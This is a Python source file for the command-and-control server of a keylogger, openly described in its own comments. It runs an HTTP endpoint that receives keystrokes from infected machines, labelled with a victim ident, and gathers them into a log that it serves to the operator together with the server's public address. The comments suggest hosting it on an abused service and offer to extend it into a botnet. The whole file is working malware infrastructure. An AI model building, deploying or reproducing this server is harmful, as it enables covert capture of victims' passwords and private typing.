# This is our CnC server. Also known as command and control.
# From this, we run commands and check what our little puppets are doing.

# Import needed libraries to host our CnC Server.
import http.server as http
import urllib.request
from urllib.parse import urlparse, parse_qs
import os
import re

# Variables.
# This is our global log. We will access this a couple of times, actually.
global logVar
logVar = "\n"

# The host it will be running on, in this case, localhost, which is also known as 127.0.0.1, note that down!
host = "localhost"

# The port it will be accessible on. If you plan to upload this to <REDACTED> and abuse it as your service, you can do so with the environment var. xD
port = os.environ.get('PORT', 443)

# We let people know which port we are running on.
print(f"Port is: {port}")

# Register Base Class -> This is our sever!
class sv(http.BaseHTTPRequestHandler):
    
    # Handle HTTP GET Request.
    def do_GET(self):

        # Urlparse path.
        global logVar
        path = urlparse(self.path).path

        # Response code 200 means "We are fine, commence forth."
        self.send_response(200, message=None)

        # It is time to set the Headers.
        # Type and content.
        self.send_header("content-type", "text/plain")
        self.end_headers()
        self.wfile.write(f"My endpoint is: {urllib.request.urlopen('https://ident.me').read().decode('utf8')}:{port}\nKeylog:\n{logVar}".encode())
        
        # In this particuliar case, we simply use this to log our "logVar", which holds the collected data.
        # Since some services don't let us access logs, this will help you keep track of your logged keystrokes.
        # Now let us commence forth with....
        # Path GET functions! This defines WHICH type of command we get from the outside. This can be extended. But for now, we simply have a keystroke endpoint for the logger.
        # You could, if wished, make reverse HTTP botnet capabilities. But maybe i will do another class for that sometime. Just ask. ^^
        # In here, we have no security checks, however, since this is a mere experiment.

        # If we are accessed with the path of "/keystroke", we log this.
        if path == "/keystroke":

            # Parse and strip,
            payload = parse_qs(urlparse(self.path).query)

            addition = re.sub("'", '', payload['key'][0])
            addition = addition.replace("Key.space", " ")
            addition = addition.replace("Key.shift", "")
            addition = addition.replace("Key.", "")
            addition = addition.replace("enter", f"\n{payload['ident'][0]}")
            addition = addition.replace("ctrl_l", "")
            addition = addition.replace("alt_l", "")
            addition = addition.replace("tab", f"\n{payload['ident'][0]}")
            addition = addition.replace("alt_gr", "")
            addition = addition.replace('""', "'")
            addition = addition.replace("_r", "")
            addition = addition.replace("_l", "")
            addition = addition.replace("capsock", "")

            if(addition == "backspace"):
                logVar = logVar.rstrip(logVar[-1])
                addition = addition.replace("backspace", "")

            # Replace and flip!
            logVar = f"{logVar}{addition}"

            # Log it and ship!
            print(f"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n{logVar}")

# We start the webserver.
webSv = http.HTTPServer((host, int(port)), sv)
print(f"We are now up and running.")

# From pythonbasics -> This gives us the opportunity to properly run and end our application.
try: 

    # Loop.
    webSv.serve_forever()

# On ctrl c...
except KeyboardInterrupt:

    # End our loooop!
    pass

# Now, if we keyboardInterrupt, we close the server because our above loop is broken.
webSv.server_close()